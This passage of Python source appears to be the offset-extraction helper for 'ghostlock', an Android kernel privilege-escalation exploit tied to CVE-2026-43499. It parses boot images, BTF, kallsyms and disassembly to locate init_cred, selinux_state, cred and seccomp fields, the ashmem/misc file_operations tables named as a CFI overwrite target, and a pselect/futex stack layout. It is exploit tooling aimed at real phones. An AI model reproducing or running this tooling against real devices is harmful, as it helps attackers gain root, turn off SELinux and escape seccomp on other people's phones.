#!/usr/bin/env python3
"""Extract only the symbols and BTF fields consumed by ghostlock."""

from __future__ import annotations

import argparse
import gzip
import json
import os
import re
import shutil
import struct
import subprocess
import sys
import tempfile
from dataclasses import dataclass, field
from pathlib import Path


ANDROID_MAGIC = b"ANDROID!"
BTF_MAGIC = 0xEB9F
PAGE_SIZE = 4096
FDT_MAGIC = 0xD00DFEED
FDT_BEGIN_NODE = 1
FDT_END_NODE = 2
FDT_PROP = 3
FDT_NOP = 4
FDT_END = 9
ARM64_MEMSTART_ALIGN = 1 << 30

KIND_INT = 1
KIND_PTR = 2
KIND_ARRAY = 3
KIND_STRUCT = 4
KIND_UNION = 5
KIND_ENUM = 6
KIND_FWD = 7
KIND_TYPEDEF = 8
KIND_VOLATILE = 9
KIND_CONST = 10
KIND_RESTRICT = 11
KIND_FUNC = 12
KIND_FUNC_PROTO = 13
KIND_VAR = 14
KIND_DATASEC = 15
KIND_FLOAT = 16
KIND_DECL_TAG = 17
KIND_TYPE_TAG = 18
KIND_ENUM64 = 19


class ExtractError(RuntimeError):
    pass


class InfeasibleError(ExtractError):
    """The kernel stack layout cannot support the pselect/futex route."""


def align(value: int, size: int) -> int:
    return (value + size - 1) & ~(size - 1)


def recover_kernel_phys_load(path: Path) -> int:
    """Recover the XBL Kernel physical base from embedded FDT memory maps."""
    data = path.read_bytes()
    candidates: set[tuple[int, int, int, int]] = set()
    cursor = 0
    while True:
        pos = data.find(struct.pack(">I", FDT_MAGIC), cursor)
        if pos < 0:
            break
        cursor = pos + 4
        if pos + 40 > len(data):
            continue
        (magic, total, struct_off, strings_off, _rsv, version, last_version,
         _cpu, strings_size, struct_size) = struct.unpack_from(">10I", data, pos)
        if magic != FDT_MAGIC or version < 16 or last_version > 17:
            continue
        if total < 40 or pos + total > len(data):
            continue
        if struct_off > total or struct_size > total - struct_off:
            continue
        if strings_off > total or strings_size > total - strings_off:
            continue
        struct_start, struct_end = pos + struct_off, pos + struct_off + struct_size
        strings_start, strings_end = pos + strings_off, pos + strings_off + strings_size
        stack: list[dict[str, object]] = []
        regions: list[tuple[str, str, int, int]] = []
        p = struct_start
        try:
            while p < struct_end:
                token = struct.unpack_from(">I", data, p)[0]
                if token == FDT_BEGIN_NODE:
                    end = data.index(b"\0", p + 4, struct_end)
                    name = data[p + 4:end].decode("ascii")
                    parent_ac = int(stack[-1]["child_ac"]) if stack else 2
                    parent_sc = int(stack[-1]["child_sc"]) if stack else 1
                    path_name = (str(stack[-1]["path"]).rstrip("/") + "/" + name) if stack else ("/" + name if name else "/")
                    stack.append({
                        "path": path_name,
                        "parent_ac": parent_ac,
                        "parent_sc": parent_sc,
                        "child_ac": 2,
                        "child_sc": 1,
                        "props": {},
                    })
                    p = align(end + 1, 4)
                elif token == FDT_END_NODE:
                    node = stack.pop()
                    props = node["props"]
                    assert isinstance(props, dict)
                    label = props.get("mem-label", b"").split(b"\0", 1)[0].decode("ascii")
                    reg = props.get("reg")
                    if "/memorymap/" in str(node["path"]) and label in {"NOMAP", "Kernel"} and reg is not None:
                        ac, sc = int(node["parent_ac"]), int(node["parent_sc"])
                        if ac not in (1, 2) or sc not in (1, 2) or len(reg) != (ac + sc) * 4:
                            raise ValueError("unsupported memory-map reg")
                        split = ac * 4
                        regions.append((label, str(node["path"]), int.from_bytes(reg[:split], "big"), int.from_bytes(reg[split:], "big")))
                    p += 4
                elif token == FDT_PROP:
                    size, name_off = struct.unpack_from(">II", data, p + 4)
                    if name_off >= strings_size or p + 12 + size > struct_end or not stack:
                        raise ValueError("invalid property")
                    ns = strings_start + name_off
                    ne = data.index(b"\0", ns, strings_end)
                    prop_name = data[ns:ne].decode("ascii")
                    props = stack[-1]["props"]
                    assert isinstance(props, dict)
                    props[prop_name] = data[p + 12:p + 12 + size]
                    if prop_name == "#address-cells" and size == 4:
                        stack[-1]["child_ac"] = int.from_bytes(props[prop_name], "big")
                    elif prop_name == "#size-cells" and size == 4:
                        stack[-1]["child_sc"] = int.from_bytes(props[prop_name], "big")
                    p = align(p + 12 + size, 4)
                elif token == FDT_NOP:
                    p += 4
                elif token == FDT_END:
                    break
                else:
                    raise ValueError("unknown FDT token")
            nomap = {(base, size) for label, _, base, size in regions if label == "NOMAP"}
            kernel = {(base, size) for label, _, base, size in regions if label == "Kernel"}
            if len(nomap) == 1 and len(kernel) == 1:
                nb, ns = next(iter(nomap)); kb, ks = next(iter(kernel))
                if nb & (PAGE_SIZE - 1) or kb & (PAGE_SIZE - 1) or not ns or not ks:
                    raise ValueError("unaligned or empty memory map")
                if not (nb & -ARM64_MEMSTART_ALIGN) <= nb < (nb & -ARM64_MEMSTART_ALIGN) + ARM64_MEMSTART_ALIGN:
                    raise ValueError("invalid NOMAP phys offset")
                candidates.add((nb, ns, kb, ks))
        except (IndexError, UnicodeError, ValueError, struct.error):
            continue
    if not candidates:
        raise ExtractError("xbl_config contains no unique NOMAP/Kernel memory map")
    if len(candidates) != 1:
        raise ExtractError(f"xbl_config contains conflicting memory maps: {sorted(candidates)}")
    return next(iter(candidates))[2]


LZ4_LEGACY_MAGIC = b"\x02\x21\x4c\x18"
LZ4_MAX_IMAGE = 0x10000000  # 256 MiB upper bound for a decompressed arm64 Image

# MediaTek loads the kernel at the DRAM base (arm64 text_offset=0); DRAM
# starts at 0x80000000 on its current flagship platforms, so this is the
# assumed load address when neither xbl_config nor --phys is available.
MTK_DEFAULT_PHYS_LOAD = 0x80000000


def decompress_lz4_legacy(payload: bytes) -> bytes:
    """MediaTek boot images store the kernel as an LZ4 legacy frame."""
    try:
        import lz4.block
    except ImportError as exc:
        raise ExtractError(
            "MediaTek kernels are LZ4-compressed; install the lz4 module "
            "(pip install lz4)"
        ) from exc
    try:
        out = lz4.block.decompress(payload[8:], uncompressed_size=LZ4_MAX_IMAGE)
    except Exception as exc:
        raise ExtractError(f"invalid LZ4-compressed kernel payload: {exc}") from exc
    if out[:2] != b"MZ" or out[0x38:0x3C] != b"ARM\x64":
        raise ExtractError("LZ4 decompression did not yield an arm64 Image")
    return out


@dataclass
class BootImage:
    path: Path
    kernel: bytes
    mtk_lz4: bool = False

    @classmethod
    def load(cls, path: Path) -> "BootImage":
        raw = path.read_bytes()
        if raw[:8] == ANDROID_MAGIC:
            if len(raw) < 44:
                raise ExtractError("truncated Android boot header")
            kernel_size, header_size, version = (
                struct.unpack_from("<I", raw, 8)[0],
                struct.unpack_from("<I", raw, 20)[0],
                struct.unpack_from("<I", raw, 40)[0],
            )
            if version not in (3, 4):
                raise ExtractError(f"unsupported boot header version {version}")
            start = align(header_size, PAGE_SIZE)
            end = start + kernel_size
            if end > len(raw):
                raise ExtractError("kernel payload exceeds boot image")
            kernel = raw[start:end]
            if kernel[:4] == LZ4_LEGACY_MAGIC:
                kernel = decompress_lz4_legacy(kernel)
                return cls(path, kernel, True)
            return cls(path, kernel)
        if raw[:3] == b"\x1f\x8b\x08":
            try:
                raw = gzip.decompress(raw)
            except OSError as exc:
                raise ExtractError(f"invalid gzip image: {exc}") from exc
        if len(raw) < 64 or raw[56:60] != b"ARM\x64":
            raise ExtractError("input is not an Android boot image or arm64 Image")
        return cls(path, raw)

    def release(self) -> str | None:
        match = re.search(rb"Linux version ([^\x00\r\n ]+)", self.kernel)
        return match.group(1).decode("ascii", "replace") if match else None

    def embedded_btf(self) -> bytes | None:
        signature = struct.pack("<HBBI", BTF_MAGIC, 1, 0, 24)
        cursor = 0
        candidates: list[bytes] = []
        while True:
            pos = self.kernel.find(signature, cursor)
            if pos < 0:
                break
            cursor = pos + 1
            if pos + 24 > len(self.kernel):
                continue
            magic, version, _flags, hdr_len, type_off, type_len, str_off, str_len = (
                struct.unpack_from("<HBBIIIII", self.kernel, pos)
            )
            if magic != BTF_MAGIC or version != 1 or hdr_len < 24:
                continue
            total = hdr_len + max(type_off + type_len, str_off + str_len)
            if total <= hdr_len or pos + total > len(self.kernel):
                continue
            strings = pos + hdr_len + str_off
            if str_len and self.kernel[strings] == 0:
                candidates.append(self.kernel[pos : pos + total])
        return max(candidates, key=len) if candidates else None


@dataclass
class BtfMember:
    name: str
    type_id: int
    bit_offset: int


@dataclass
class BtfType:
    type_id: int
    name: str
    kind: int
    size: int
    members: list[BtfMember] = field(default_factory=list)
    enum_values: list[tuple[str, int]] = field(default_factory=list)


class Btf:
    def __init__(self, raw: bytes):
        if len(raw) < 24:
            raise ExtractError("truncated BTF header")
        magic, version, _flags, hdr_len, type_off, type_len, str_off, str_len = (
            struct.unpack_from("<HBBIIIII", raw, 0)
        )
        if magic != BTF_MAGIC or version != 1 or hdr_len < 24:
            raise ExtractError("invalid BTF header")
        self.types_raw = raw[hdr_len + type_off : hdr_len + type_off + type_len]
        self.strings = raw[hdr_len + str_off : hdr_len + str_off + str_len]
        self.types: dict[int, BtfType] = {}
        self.by_name: dict[str, list[BtfType]] = {}
        self._parse()

    def string(self, offset: int) -> str:
        if offset == 0:
            return ""
        if offset < 0 or offset >= len(self.strings):
            raise ExtractError(f"invalid BTF string offset {offset}")
        end = self.strings.find(b"\x00", offset)
        if end < 0:
            raise ExtractError("unterminated BTF string")
        return self.strings[offset:end].decode("utf-8", "replace")

    def _parse(self) -> None:
        fixed = {
            KIND_INT: 4, KIND_PTR: 0, KIND_ARRAY: 12, KIND_ENUM: 8,
            KIND_FWD: 0, KIND_TYPEDEF: 0, KIND_VOLATILE: 0, KIND_CONST: 0,
            KIND_RESTRICT: 0, KIND_FUNC: 0, KIND_FUNC_PROTO: 8,
            KIND_VAR: 4, KIND_DATASEC: 12, KIND_FLOAT: 0,
            KIND_DECL_TAG: 8, KIND_TYPE_TAG: 0, KIND_ENUM64: 12,
        }
        cursor = 0
        type_id = 1
        while cursor < len(self.types_raw):
            if cursor + 12 > len(self.types_raw):
                raise ExtractError("truncated BTF type record")
            name_off, info, size_or_type = struct.unpack_from(
                "<III", self.types_raw, cursor
            )
            cursor += 12
            kind = (info >> 24) & 0x1F
            vlen = info & 0xFFFF
            item = BtfType(type_id, self.string(name_off), kind, size_or_type)
            if kind in (KIND_STRUCT, KIND_UNION):
                extra = vlen * 12
                if cursor + extra > len(self.types_raw):
                    raise ExtractError("truncated BTF members")
                for index in range(vlen):
                    name, member_type, bit_offset = struct.unpack_from(
                        "<III", self.types_raw, cursor + index * 12
                    )
                    item.members.append(
                        BtfMember(self.string(name), member_type, bit_offset & 0xFFFFFF)
                    )
                cursor += extra
            elif kind == KIND_ENUM:
                extra = vlen * 8
                if cursor + extra > len(self.types_raw):
                    raise ExtractError("truncated BTF enum members")
                kflag = bool(info & (1 << 31))
                for index in range(vlen):
                    ename, raw_value = struct.unpack_from(
                        "<II", self.types_raw, cursor + index * 8
                    )
                    if kflag:
                        raw_value = struct.unpack(
                            "<i", struct.pack("<I", raw_value)
                        )[0]
                    item.enum_values.append((self.string(ename), raw_value))
                cursor += extra
            elif kind == KIND_ENUM64:
                extra = vlen * 12
                if cursor + extra > len(self.types_raw):
                    raise ExtractError("truncated BTF enum64 members")
                kflag = bool(info & (1 << 31))
                for index in range(vlen):
                    ename, low, high = struct.unpack_from(
                        "<III", self.types_raw, cursor + index * 12
                    )
                    value = low | (high << 32)
                    if kflag and high & 0x80000000:
                        value -= 1 << 64
                    item.enum_values.append((self.string(ename), value))
                cursor += extra
            else:
                unit = fixed.get(kind)
                if unit is None:
                    raise ExtractError(f"unsupported BTF kind {kind}")
                cursor += unit * vlen if kind in (
                    KIND_FUNC_PROTO, KIND_DATASEC
                ) else unit
            self.types[type_id] = item
            if item.name:
                self.by_name.setdefault(item.name, []).append(item)
            type_id += 1

    def struct(self, name: str) -> BtfType | None:
        candidates = [
            item for item in self.by_name.get(name, [])
            if item.kind in (KIND_STRUCT, KIND_UNION)
        ]
        return max(candidates, key=lambda item: len(item.members)) if candidates else None

    def resolve(self, type_id: int) -> BtfType | None:
        seen: set[int] = set()
        while type_id and type_id not in seen:
            seen.add(type_id)
            item = self.types.get(type_id)
            if item is None:
                return None
            if item.kind not in (KIND_TYPEDEF, KIND_VOLATILE, KIND_CONST, KIND_RESTRICT, KIND_TYPE_TAG):
                return item
            type_id = item.size
        return None

    def _find_member(self, item: BtfType, name: str, base: int, seen: set[int]) -> int | None:
        if item.type_id in seen:
            return None
        seen.add(item.type_id)
        for member in item.members:
            offset = base + member.bit_offset
            if member.name == name:
                return offset // 8
            if member.name == "":
                child = self.resolve(member.type_id)
                if child is not None and child.kind in (KIND_STRUCT, KIND_UNION):
                    found = self._find_member(child, name, offset, seen.copy())
                    if found is not None:
                        return found
        return None

    def field(self, struct_name: str, field_name: str) -> int | None:
        item = self.struct(struct_name)
        return self._find_member(item, field_name, 0, set()) if item else None

    def size(self, struct_name: str) -> int | None:
        item = self.struct(struct_name)
        return item.size if item else None

    def enum_value(self, enum_name: str, member_name: str) -> int | None:
        """Value of one member of a named enum/enum64; None when ambiguous."""
        items = [
            item for item in self.by_name.get(enum_name, [])
            if item.kind in (KIND_ENUM, KIND_ENUM64)
        ]
        if not items:
            return None
        item = max(items, key=lambda item: len(item.enum_values))
        values = [value for name, value in item.enum_values if name == member_name]
        return values[0] if len(values) == 1 else None

    def unique_enum_member_value(self, member_name: str) -> int | None:
        """Value of an enum member that appears exactly once in the whole BTF."""
        matches = [
            (item.type_id, value)
            for item in self.types.values()
            if item.kind in (KIND_ENUM, KIND_ENUM64)
            for name, value in item.enum_values
            if name == member_name
        ]
        if len(matches) != 1:
            return None
        return matches[0][1]

    def type_size(self, type_id: int, seen: frozenset[int] = frozenset()) -> int | None:
        """Byte size of a BTF type id, resolving qualifiers and arrays."""
        resolved = self.resolve(type_id)
        if resolved is None:
            return None
        if resolved.kind == KIND_PTR:
            return 8
        if resolved.kind == KIND_ARRAY:
            return None
        if resolved.type_id in seen:
            return None
        if resolved.kind in (KIND_INT, KIND_STRUCT, KIND_UNION, KIND_ENUM,
                             KIND_ENUM64, KIND_FLOAT):
            return resolved.size
        return None

    def direct_field_size(self, struct_name: str, field_name: str) -> int | None:
        """Byte size of a direct (non-anonymous) struct member's type."""
        item = self.struct(struct_name)
        if item is None:
            return None
        matches = [member for member in item.members if member.name == field_name]
        if len(matches) != 1:
            return None
        return self.type_size(matches[0].type_id)


def parse_kallsyms(path: Path) -> tuple[dict[str, set[int]], dict[str, set[str]]]:
    symbols: dict[str, set[int]] = {}
    types: dict[str, set[str]] = {}
    pattern = re.compile(r"^([0-9a-fA-F]{8,16})\s+(\S)\s+(.+?)\s*$")
    for line in path.read_text("utf-8", "replace").splitlines():
        match = pattern.match(line)
        if not match:
            continue
        address, symbol_type, name = match.groups()
        value = int(address, 16)
        if value == 0:
            continue
        symbols.setdefault(name, set()).add(value)
        types.setdefault(name, set()).add(symbol_type)
    if "_text" not in symbols and "_head" not in symbols:
        raise ExtractError("kallsyms has no _text or _head symbol")
    return symbols, types


def unique(symbols: dict[str, set[int]], name: str) -> int | None:
    values = symbols.get(name, set())
    return next(iter(values)) if len(values) == 1 else None


def find_data_symbol(
    symbols: dict[str, set[int]], types: dict[str, set[str]], exact: str,
    fragments: tuple[str, ...] = (),
) -> int | None:
    address = unique(symbols, exact)
    if address is not None:
        return address
    matches: set[int] = set()
    for name, values in symbols.items():
        if not fragments or not all(fragment.lower() in name.lower() for fragment in fragments):
            continue
        if not (types.get(name, set()) & set("dDbB")):
            continue
        matches.update(values)
    return next(iter(matches)) if len(matches) == 1 else None


def find_function(symbols: dict[str, set[int]], exact: str, fragments: tuple[str, ...] = ()) -> int | None:
    address = unique(symbols, exact)
    if address is not None:
        return address
    matches: set[int] = set()
    for name, values in symbols.items():
        if all(fragment.lower() in name.lower() for fragment in fragments):
            matches.update(values)
    return next(iter(matches)) if len(matches) == 1 else None


SYMBOLS = {
    "off_init_task": ("init_task",),
    "off_init_cred": ("init_cred",),
    "off_root_task_group": ("root_task_group",),
    "off_selinux_enforcing": ("selinux_state",),
    "off_selinux_blob_sizes": ("selinux_blob_sizes",),
    "off_security_hook_heads": ("security_hook_heads",),
    "off_kmalloc_caches": ("kmalloc_caches",),
    "off_anon_pipe_buf_ops": ("anon_pipe_buf_ops",),
    "off_slide_nfulnl_logger": ("nfulnl_logger",),
    "off_slide_boot_id": ("sysctl_bootid",),
}

FUNCTIONS = {
    "off_configfs_read_iter": ("configfs_read_iter",),
    "off_configfs_bin_write_iter": ("configfs_bin_write_iter",),
    "off_copy_splice_read": ("copy_splice_read",),
    "off_noop_llseek": ("noop_llseek",),
}

ASHMEM_FUNCTIONS = {
    "off_ashmem_ioctl": (
        "ashmem_ioctl",
        ("fops_ioctl", "ashmem_rust6Ashmem"),
        ("MiscdeviceVTable", "ashmem_rust6Ashmem", "6AshmemE5ioctl"),
    ),
    "off_ashmem_compat_ioctl": (
        "compat_ashmem_ioctl",
        ("fops_compat_ioctl", "ashmem_rust6Ashmem"),
        ("MiscdeviceVTable", "ashmem_rust6Ashmem", "6AshmemE12compat_ioctl"),
    ),
    "off_ashmem_mmap": (
        "ashmem_mmap",
        ("fops_mmap", "ashmem_rust6Ashmem"),
        ("MiscdeviceVTable", "ashmem_rust6Ashmem", "6AshmemE4mmap"),
    ),
    "off_ashmem_open": (
        "ashmem_open",
        ("fops_open", "ashmem_rust6Ashmem"),
        ("MiscdeviceVTable", "ashmem_rust6Ashmem", "6AshmemE4open"),
    ),
    "off_ashmem_release": (
        "ashmem_release",
        ("fops_release", "ashmem_rust6Ashmem"),
        ("MiscdeviceVTable", "ashmem_rust6Ashmem", "6AshmemE7release"),
    ),
    "off_ashmem_show_fdinfo": (
        "ashmem_show_fdinfo",
        ("fops_show_fdinfo", "ashmem_rust6Ashmem"),
        ("MiscdeviceVTable", "ashmem_rust6Ashmem", "6AshmemE11show_fdinfo"),
    ),
}

# file_operations slot offsets: classic C layout (OPPO 6.6) vs 6.12+ Rust
# vtable, which differ by one 8-byte field before unlocked_ioctl.
ASHMEM_FOPS_LAYOUTS = (
    {
        "off_ashmem_ioctl": 0x50,
        "off_ashmem_compat_ioctl": 0x58,
        "off_ashmem_mmap": 0x60,
        "off_ashmem_open": 0x68,
        "off_ashmem_release": 0x78,
        "off_ashmem_show_fdinfo": 0xd8,
    },
    {
        "off_ashmem_ioctl": 0x48,
        "off_ashmem_compat_ioctl": 0x50,
        "off_ashmem_mmap": 0x58,
        "off_ashmem_open": 0x68,
        "off_ashmem_release": 0x78,
        "off_ashmem_show_fdinfo": 0xd8,
    },
)


# GKI kernels drop some data symbols; unresolved optionals emit 0 and the
# runtime falls back to target.h defaults.
OPTIONAL_SYMBOLS = {
    "off_security_hook_heads",
    "off_ashmem_fops",
    "off_ashmem_misc_fops",
}

STRUCT_FIELDS = {
    "task_struct": {
        "task_prio": "prio", "task_normal_prio": "normal_prio",
        "task_sched_task_group": "sched_task_group", "task_pi_lock": "pi_lock",
        "task_pi_waiters": "pi_waiters", "task_pi_top_task": "pi_top_task",
        "task_pi_blocked_on": "pi_blocked_on", "task_pid": "pid", "task_tgid": "tgid",
        "task_atomic_flags": "atomic_flags",
        "task_real_cred": "real_cred", "task_cred": "cred", "task_comm": "comm",
        "task_tasks": "tasks", "task_seccomp": "seccomp",
    },
    "rt_mutex_waiter": {
        "waiter_tree": "tree", "waiter_pi_tree": "pi_tree", "waiter_task": "task",
        "waiter_lock": "lock", "waiter_wake_state": "wake_state", "waiter_ww_ctx": "ww_ctx",
    },
    "cred": {
        "cred_uid": "uid", "cred_securebits": "securebits",
        "cred_caps": "cap_inheritable", "cred_security": "security",
    },
    "seccomp": {
        "seccomp_mode": "mode", "seccomp_filter_count": "filter_count", "seccomp_filter": "filter",
    },
    "file_operations": {
        "fops_owner": "owner", "fops_llseek": "llseek", "fops_read": "read",
        "fops_write": "write", "fops_read_iter": "read_iter", "fops_write_iter": "write_iter",
        "fops_ioctl": "unlocked_ioctl", "fops_compat_ioctl": "compat_ioctl", "fops_mmap": "mmap",
        "fops_open": "open", "fops_release": "release", "fops_splice_read": "splice_read",
        "fops_show_fdinfo": "show_fdinfo",
    },
    "configfs_buffer": {
        "cfg_page": "page", "cfg_needs_read_fill": "needs_read_fill",
        "cfg_bin_buffer": "bin_buffer", "cfg_bin_buffer_size": "bin_buffer_size",
        "cfg_cb_max_size": "cb_max_size",
    },
}


def resolve_symbols(
    symbols: dict[str, set[int]], types: dict[str, set[str]],
    btf: Btf | None, base: int, release: str | None,
) -> dict[str, int | None]:
    result: dict[str, int | None] = {}
    for name, (symbol,) in SYMBOLS.items():
        result[name] = unique(symbols, symbol)
    for name, (symbol,) in FUNCTIONS.items():
        result[name] = unique(symbols, symbol)
    result["off_slide_loggers_0_1"] = (
        unique(symbols, "loggers") + 0x10 if unique(symbols, "loggers") is not None else None
    )
    # Rust ashmem keeps the fops table in a BSS static (ASHMEM_FOPS_PTR) that
    # is filled at init, so prefer its kallsyms anchor over the in-file scan.
    # The generic ("ashmem", "fops") fragments also match get_shmem_fops/
    # VMFILE_FOPS, so only use them as a last resort.
    result["off_ashmem_fops"] = find_data_symbol(
        symbols, types, "ashmem_fops", ("ashmem_fops_ptr",)
    )
    if result["off_ashmem_fops"] is None:
        result["off_ashmem_fops"] = find_data_symbol(
            symbols, types, "ashmem_fops", ("ashmem", "fops")
        )
    # Rust ashmem registers its miscdevice at runtime and leaves no static
    # ashmem_misc slot; the misc class file_operations table (misc_fops) is a
    # stable writable data symbol used as the CFI write/restore target.
    misc = find_data_symbol(symbols, types, "ashmem_misc", ("ashmem_misc",))
    misc_fops_field = btf.field("miscdevice", "fops") if btf else None
    if misc_fops_field is None and btf is None and kernel_struct_macro(release) == "STRUCT_OFFSETS_6_6":
        # No BTF: miscdevice.fops is at 0x10 on 6.6 (after minor/name).
        misc_fops_field = 0x10
    if misc is not None and misc_fops_field is not None:
        result["off_ashmem_misc_fops"] = misc + misc_fops_field
    else:
        result["off_ashmem_misc_fops"] = find_data_symbol(
            symbols, types, "misc_fops", ("misc_fops",)
        )
        if result["off_ashmem_misc_fops"] is None:
            # Last resort: a Rust lockdep key near the MiscDevice static.
            misc = find_data_symbol(symbols, types, "ashmem_misc", ("ashmem", "misc"))
            result["off_ashmem_misc_fops"] = (
                misc + misc_fops_field
                if misc is not None and misc_fops_field is not None
                else None
            )
    for field_name, patterns in ASHMEM_FUNCTIONS.items():
        exact, *fragment_patterns = patterns
        value = unique(symbols, exact)
        if value is None:
            for fragments in fragment_patterns:
                value = find_function(symbols, exact, fragments)
                if value is not None:
                    break
        result[field_name] = value
    return {
        name: None if value is None else value - base
        for name, value in result.items()
    }


def scan_ashmem_fops(
    kernel: bytes, base: int, resolved: dict[str, int | None]
) -> int | None:
    """Scan for a file_operations whose slots point at the resolved ashmem
    functions; 6.12+ Rust ashmem exposes no kallsyms data symbol, so this is
    the only reliable way to resolve off_ashmem_fops there.
    Returns the _text-relative offset, or None when not unique."""
    candidates: set[int] = set()
    for layout in ASHMEM_FOPS_LAYOUTS:
        slots = [
            (key, off) for key, off in layout.items() if resolved.get(key) is not None
        ]
        if len(slots) < 4:
            continue
        anchor_key, anchor_off = slots[0]
        anchor = struct.pack("<Q", base + resolved[anchor_key])
        max_slot = max(off for _, off in slots)
        pos = 0
        while True:
            pos = kernel.find(anchor, pos)
            if pos < 0:
                break
            start = pos - anchor_off
            if start >= 0 and start % 8 == 0 and start + max_slot + 8 <= len(kernel):
                if all(
                    struct.unpack_from("<Q", kernel, start + off)[0]
                    == base + resolved[key]
                    for key, off in slots[1:]
                ):
                    candidates.add(start)
            pos += 1
    return next(iter(candidates)) if len(candidates) == 1 else None



# llvm-objdump auto-derives pselect_waiter_shift and the nf_logger slide slot
# (ported from Linuxoid-cn/CVE-2026-43499-Poc-Analysis generate_target.py).
# arm64 Image is PE/COFF, so objdump addresses equal base-relative kallsyms
# offsets (raw == vaddr == RVA).

PSELECT_ROUTE_NFDS = 320
OBJDUMP_CAP = 0x2000


def find_llvm_objdump(explicit: str | None) -> str | None:
    """Locate llvm-objdump: --llvm-objdump, PATH, then common NDK installs."""
    if explicit:
        tool = Path(explicit)
        if not tool.is_file():
            raise ExtractError(f"llvm-objdump not found: {tool}")
        return str(tool)
    tool = shutil.which("llvm-objdump")
    if tool:
        return tool
    roots = [
        Path(os.environ.get("ANDROID_NDK_HOME", "")),
        Path(os.environ.get("ANDROID_NDK_ROOT", "")),
        Path(os.environ.get("LOCALAPPDATA", "")) / "Android" / "Sdk" / "ndk",
        Path("D:/AndroidSDK/ndk"),
    ]
    for root in roots:
        if not root.is_dir():
            continue
        prebuilts = sorted(
            root.glob("*/toolchains/llvm/prebuilt/*/bin/llvm-objdump.exe")
        )
        if prebuilts:
            return str(prebuilts[-1])
        direct = root / "toolchains/llvm/prebuilt/windows-x86_64/bin/llvm-objdump.exe"
        if direct.is_file():
            return str(direct)
    return None


def run_objdump(tool: str, kernel_path: Path, start: int, stop: int) -> str:
    if stop <= start or stop - start > 0x20000:
        raise ExtractError(f"disassembly range invalid: 0x{start:x}..0x{stop:x}")
    proc = subprocess.run(
        [
            tool, "-d", "--triple=aarch64",
            f"--start-address=0x{start:x}", f"--stop-address=0x{stop:x}",
            str(kernel_path),
        ],
        text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    if proc.returncode != 0:
        raise ExtractError(f"llvm-objdump failed: {proc.stderr.strip()}")
    if "Disassembly of section" not in proc.stdout:
        raise ExtractError(
            f"llvm-objdump produced no disassembly for 0x{start:x}..0x{stop:x}"
        )
    return proc.stdout


def relative_symbols(
    symbols: dict[str, set[int]], base: int
) -> tuple[dict[str, set[int]], list[int]]:
    """Rebase kallsyms onto _text and return a sorted list of all offsets."""
    relative: dict[str, set[int]] = {}
    all_offsets: set[int] = set()
    for name, values in symbols.items():
        offsets = {value - base for value in values if value >= base}
        if offsets:
            relative[name] = offsets
            all_offsets.update(offsets)
    return relative, sorted(all_offsets)


def unique_offset(symbols: dict[str, set[int]], name: str) -> int:
    values = symbols.get(name)
    if not values or len(values) != 1:
        raise ExtractError(
            f"kallsyms symbol {name!r} not unique: "
            + repr(sorted(hex(v) for v in values or set()))
        )
    return next(iter(values))


def disassemble_symbol(
    tool: str,
    kernel_path: Path,
    symbols: dict[str, set[int]],
    sorted_offsets: list[int],
    name: str,
    cap: int = OBJDUMP_CAP,
) -> str:
    start = unique_offset(symbols, name)
    higher = [off for off in sorted_offsets if off > start]
    stop = min(start + cap, higher[0] if higher else start + cap)
    return run_objdump(tool, kernel_path, start, stop)


def first_sp_frame(text: str, name: str) -> int:
    matches = re.findall(r"\bsub\s+sp,\s*sp,\s*#0x([0-9a-f]+)", text, re.I)
    if not matches:
        raise ExtractError(f"{name} has no explicit `sub sp,sp,#imm` frame")
    return int(matches[0], 16)


def has_direct_call(text: str, target: int) -> bool:
    return bool(re.search(rf"\bbl\s+0x{target:x}\b", text, re.I))


def validate_frame_live_at(text: str, anchor: str, name: str) -> None:
    """Prove the first explicit frame allocation is still live at one anchor."""
    lines = text.splitlines()
    anchors = [
        index for index, line in enumerate(lines)
        if re.search(anchor, line, re.I)
    ]
    if len(anchors) != 1:
        raise ExtractError(f"{name} frame anchor not unique: {len(anchors)}")
    anchor_index = anchors[0]
    subs = [
        index for index, line in enumerate(lines[:anchor_index])
        if re.search(r"\bsub\s+sp,\s*sp,\s*#0x[0-9a-f]+", line, re.I)
    ]
    if len(subs) != 1:
        raise ExtractError(f"{name} has {len(subs)} SP frames before anchor")
    for index in range(subs[0] + 1, anchor_index):
        line = lines[index]
        if re.search(r"\[\s*sp\],\s*#0x[0-9a-f]+", line, re.I):
            raise ExtractError(f"{name} restores SP post-index before anchor")
        if re.search(r"\b(?:add|sub)\s+sp,\s*sp,", line, re.I):
            rest = lines[index + 1:anchor_index]
            if not any(
                re.search(r"\bd65f03c0\b|\bret\b", tail, re.I)
                for tail in rest
            ):
                raise ExtractError(f"{name} adjusts SP again before anchor")


def derive_pselect_layout(
    tool: str,
    kernel_path: Path,
    symbols: dict[str, set[int]],
    sorted_offsets: list[int],
    btf: Btf,
    route_nfds: int,
) -> dict[str, int]:
    """Derive the pselect/futex waiter word shift from disassembly, handling
    both pselect chains (inlined or via do_pselect) and both futex dispatch
    styles (via do_futex or direct)."""
    names = {
        "pselect_wrapper": "__arm64_sys_pselect6",
        "pselect_core": "core_sys_select",
        "futex_wrapper": "__arm64_sys_futex",
        "futex_dispatch": "do_futex",
        "futex_wait": "futex_wait_requeue_pi",
    }
    if unique_offset_optional(symbols, "do_pselect") is not None:
        names["pselect_dispatch"] = "do_pselect"

    dis = {
        key: disassemble_symbol(tool, kernel_path, symbols, sorted_offsets, name)
        for key, name in names.items()
    }

    pselect_chain = ["pselect_wrapper"]
    pselect_core_addr = unique_offset(symbols, names["pselect_core"])
    if has_direct_call(dis["pselect_wrapper"], pselect_core_addr):
        pass
    elif "pselect_dispatch" in names and has_direct_call(
        dis["pselect_wrapper"], unique_offset(symbols, names["pselect_dispatch"])
    ):
        if not has_direct_call(dis["pselect_dispatch"], pselect_core_addr):
            raise ExtractError("do_pselect does not directly call core_sys_select")
        pselect_chain.append("pselect_dispatch")
    else:
        raise ExtractError(
            "__arm64_sys_pselect6 calls neither core_sys_select nor do_pselect"
        )
    pselect_chain.append("pselect_core")

    futex_chain = ["futex_wrapper"]
    futex_wait_addr = unique_offset(symbols, names["futex_wait"])
    if has_direct_call(dis["futex_wrapper"], futex_wait_addr):
        pass
    elif has_direct_call(
        dis["futex_wrapper"], unique_offset(symbols, names["futex_dispatch"])
    ):
        if not has_direct_call(dis["futex_dispatch"], futex_wait_addr):
            raise ExtractError(
                "do_futex does not directly call futex_wait_requeue_pi"
            )
        futex_chain.append("futex_dispatch")
    else:
        raise ExtractError(
            "__arm64_sys_futex calls neither do_futex nor futex_wait_requeue_pi"
        )
